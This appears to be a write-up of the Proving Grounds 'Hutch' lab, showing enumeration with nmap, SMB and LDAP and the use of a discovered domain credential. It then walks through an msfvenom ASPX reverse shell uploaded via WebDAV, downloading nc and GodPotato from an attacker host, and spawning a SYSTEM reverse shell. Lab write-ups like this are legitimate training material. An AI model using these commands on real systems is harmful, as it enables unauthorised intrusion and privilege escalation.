---
title: Hutch
date: 2026-01-25T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - enum4linux-ng
  - smb
  - rpc
  - godpotato
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hutch"
---
`nmap -p- -v 192.168.139.122 --min-rate 5000`

![](Screenshot%202026-01-11%20at%2010.52.54.png)

 nmap -p- -sV -sC -sS 192.168.116.122 --min-rate 5000

![](Screenshot%202026-01-14%20at%2013.12.14.png)

Port 80 no giving us much:

![](Screenshot%202026-01-11%20at%2010.54.26.png)

`enum4linux-ng -A 192.168.139.122

![](Screenshot%202026-01-11%20at%2011.00.40.png)

SMB: 

`smbclient -N -L  //192.168.139.122/`

`smbmap -H 192.168.139.122`
	

![](Screenshot%202026-01-11%20at%2011.02.38.png)

![](Screenshot%202026-01-11%20at%2011.11.13.png)

Not really having much luck. 

LDAP:

`ldapsearch -H ldap://192.168.116.122 -x -b "DC=hutch,DC=offsec" > ldap_dump.txt`

![](Screenshot%202026-01-14%20at%2008.58.40.png)

`ldapsearch -x -H ldap://192.168.116.122 -D 'hutch.offsec\fmcsorley' -w 'CrabSharkJellyfish192' -b "DC=hutch,DC=offsec"`

`rpcclient --user=hutch.offsec/fmcsorley%CrabSharkJellyfish192 192.168.116.122`

![](Screenshot%202026-01-14%20at%2012.23.36.png)
![](Screenshot%202026-01-14%20at%2012.25.22.png)

Create a msfvenom payload:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.168 LPORT=1234 -f aspx -o shell.aspx`

`cadaver http://192.168.116.122`

User:fmcsorley
Pass:CrabSharkJellyfish192

![](Screenshot%202026-01-14%20at%2013.31.46.png)

`put shell.aspx`

![](Screenshot%202026-01-14%20at%2015.05.44.png)

To execute the script navigate to: `http:192.168.116.122/shell.aspx`


![](Screenshot%202026-01-14%20at%2015.08.01.png)

![](Screenshot%202026-01-14%20at%2015.01.06.png)

![](Screenshot%202026-01-14%20at%2015.33.17.png)
![](Screenshot%202026-01-14%20at%2019.49.17.png)

Transfer over nc64.exe and a copy of godpotato-net4:

`curl http://192.168.45.168:80/nc64.exe -o nc.exe

`curl http://192.168.45.168:81/ GodPotato-NET4.exe  -o gp.exe

`.\gp.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe  192.168.45.168 80"

![](Screenshot%202026-01-14%20at%2019.40.58.png)